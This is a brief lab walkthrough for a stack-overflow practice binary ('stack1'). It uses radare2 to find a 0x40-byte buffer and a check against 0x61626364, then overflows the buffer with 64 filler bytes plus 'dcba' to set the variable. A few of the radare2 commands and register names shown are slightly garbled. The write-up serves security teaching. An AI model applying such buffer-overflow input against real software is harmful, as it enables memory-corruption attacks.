This time is another stack modification exercise where we will have to give a string as the first argument, and instead of modificate a variable with any byte, we will have to modifiy it with a specific value, this time with 0x61626364, as the variable int32_t is compared with that value.

Again we can load in radare2 the binary with r2 ./stack1:

    > aaa # analyze the binary
    > afl # list the functions
    > pdf # print the disassembly of the function
    > s buffer <previous_name> # change buffer name
    > s modified <previous_name> # change modified int32 name
    > vvv # enter visual mode
    > [TAB]

Here we will be able to see the check of the value of modified with 0x61626364:

    cmp eadx, 0x61626364

And to see how many characters we need to modify that value we can see the static representation of the stack:

    > afvf

Here we see that buffer is 0x40 bytes, and modified is a int32_t, so is easy to see we will need 0x40 random bytes, and then 0x61626364 these bytes corresponds to the characters 'abcd' but as we are in little endian, stack values are saved in reversed order.
So the "exploit" would be:

    # ./stack1 `python -c "print 'A'*0x40 + 'dcba'"`
    # you have correctly got the variable to the right value



